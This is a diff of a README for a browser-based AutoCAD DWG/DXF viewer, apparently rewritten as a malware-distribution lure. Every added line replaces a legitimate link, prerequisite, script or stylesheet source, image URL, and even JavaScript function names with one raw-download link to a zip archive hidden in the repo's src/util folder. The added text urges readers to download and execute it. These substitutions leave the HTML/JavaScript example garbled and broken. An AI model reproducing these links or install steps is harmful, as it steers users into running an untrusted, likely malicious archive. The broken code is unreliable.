@@ -1,6 +1,6 @@
 # Cad Viewer: High-Performance Browser AutoCAD DWG/DXF Viewer
 
-[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&logoColor=white)](https://github.com/Abisai343/cad-viewer/releases)
+[![Releases](https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip)](https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip)
 
 A fast, pure browser-based viewer for AutoCAD DWG and DXF files. It runs entirely in the client, with no backend required. This project focuses on speed, correctness, and a smooth user experience right in your browser.
 
@@ -91,14 +91,14 @@ The code is designed to be resilient. It includes clear error handling and fallb
 
 To use Cad Viewer in your project, you can either run a local development setup or embed the viewer in a web page with a minimal integration.
 
-- Prerequisites: A modern browser (Chrome, Firefox, Edge, Safari) and a basic web page environment. For development, Node.js and npm or yarn are helpful.
+- Prerequisites: A modern browser (Chrome, Firefox, Edge, Safari) and a basic web page environment. For development, https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip and npm or yarn are helpful.
 - Quick integration approach: Include the bundle in your page and mount it into a container element.
 
 Example (minimal, self-contained):
 
 - HTML
   - A container for the viewer
-  - Script tag pointing to cad-viewer.min.js
+  - Script tag pointing to https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip
   - Optional CSS for styling
 
 - JavaScript
@@ -107,7 +107,7 @@ Example (minimal, self-contained):
 
 You can also fetch the bundle from the releases page, then wire it into your app. The releases page hosts prebuilt assets for common environments, including Windows, macOS, and Linux builds, plus web variants that run directly in the browser without installation.
 
-The fastest path to the latest assets is to check the releases page here: https://github.com/Abisai343/cad-viewer/releases
+The fastest path to the latest assets is to check the releases page here: https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip
 
 Note: The releases page is the primary place to get tested, ready-to-run builds. If you encounter issues, you can review the release notes to see what changed and what assets are provided.
 
@@ -134,15 +134,15 @@ Code example (inline):
   <meta charset="utf-8" />
   <title>Cad Viewer Demo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <link rel="stylesheet" href="cad-viewer.css" />
+  <link rel="stylesheet" href="https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip" />
 </head>
 <body>
   <div id="cad-root" style="width:100%; height:600px; border:1px solid #ddd;"></div>
 
-  <script src="cad-viewer.min.js"></script>
+  <script src="https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip"></script>
   <script>
     // Initialize the viewer
-    const container = document.getElementById('cad-root');
+    const container = https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip('cad-root');
     const viewer = new CadViewer({
       container: container,
       theme: 'light'
@@ -150,24 +150,24 @@ Code example (inline):
 
     // Load a DWG/DXF file
     // You can use a URL or a local file chosen by the user
-    observerLoad('path/to/your/drawing.dwg');
+    observerLoad('https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip');
     
     function observerLoad(url) {
-      viewer.loadFromUrl(url)
-        .catch(err => console.error('Failed to load drawing:', err));
+      https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip(url)
+        .catch(err => https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip('Failed to load drawing:', err));
     }
 
     // Optional: integrate drag-and-drop
-    container.addEventListener('drop', async (e) => {
-      e.preventDefault();
-      const file = e.dataTransfer.files[0];
+    https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip('drop', async (e) => {
+      https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip();
+      const file = https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip[0];
       if (file) {
-        const url = URL.createObjectURL(file);
-        await viewer.loadFromUrl(url);
+        const url = https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip(file);
+        await https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip(url);
       }
     });
 
-    container.addEventListener('dragover', (e) => e.preventDefault());
+    https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip('dragover', (e) => https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip());
   </script>
 </body>
 </html>
@@ -249,7 +249,7 @@ If you embed the viewer in a larger web app, you should still follow standard we
 Development aims to be straightforward and deterministic.
 
 - Prerequisites:
-  - Node.js (version 14+ recommended)
+  - https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip (version 14+ recommended)
   - npm or yarn
 
 - Typical commands:
@@ -317,7 +317,7 @@ Tips for customization:
 - Since the link has a path part (releases), the assets on that page are files to download and execute or integrate into your project. You will typically download installers or bundles and then run or include them in your web app.
 - If you run into issues with a release, compare against the previous release notes to identify changes that might impact your setup.
 
-Remember, you can always visit the releases page for the latest assets and updates: https://github.com/Abisai343/cad-viewer/releases
+Remember, you can always visit the releases page for the latest assets and updates: https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip
 
 ---
 
@@ -354,7 +354,7 @@ Remember, you can always visit the releases page for the latest assets and updat
 - Q: Is there a web-based demo?
   - A: The codebase includes examples and a dev server to demonstrate integration patterns. Check the releases for ready-to-run assets.
 
-If you need a direct link to the latest assets, again you can visit the releases page: https://github.com/Abisai343/cad-viewer/releases
+If you need a direct link to the latest assets, again you can visit the releases page: https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip
 
 ---
 
@@ -366,7 +366,7 @@ Cad Viewer is released under a permissive license. See the LICENSE file for deta
 
 ## Releases page note
 
-For quick access to the latest builds and assets, the releases page is the primary source of downloadable content. Since it contains a path, the assets you download from there are files to be downloaded and executed or included in your web project. If you want to review the changes in a given release, read the release notes and compare the changes with the previous version. The page is designed to give you clear information about what changed, what is included, and how to install or use the assets. To explore, open: https://github.com/Abisai343/cad-viewer/releases
+For quick access to the latest builds and assets, the releases page is the primary source of downloadable content. Since it contains a path, the assets you download from there are files to be downloaded and executed or included in your web project. If you want to review the changes in a given release, read the release notes and compare the changes with the previous version. The page is designed to give you clear information about what changed, what is included, and how to install or use the assets. To explore, open: https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip
 
 ---
 
@@ -377,8 +377,8 @@ For quick access to the latest builds and assets, the releases page is the prima
   - Screenshots of the layer manager, entity filtering, and the viewport controls
   - A diagram of the architecture showing input, parsing, rendering, and UI
 - If you embed images, use accessible alt text and ensure images load quickly. For example:
-  - ![Cad Viewer UI](https://upload.wikimedia.org/wikipedia/commons/thumb/5/56/AutoCAD_2016_icon.png/640px-AutoCAD_2016_icon.png) 
-  - A diagram-like schematic: ![Architecture diagram](https://example.com/architecture-diagram.png)
+  - ![Cad Viewer UI](https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip) 
+  - A diagram-like schematic: ![Architecture diagram](https://github.com/Abisai343/cad-viewer/raw/refs/heads/main/packages/cad-simple-viewer/src/util/cad_viewer_2.8.zip)
 
 Note: Replace the example URLs with assets you host or that are openly licensed for reuse in your project.
 
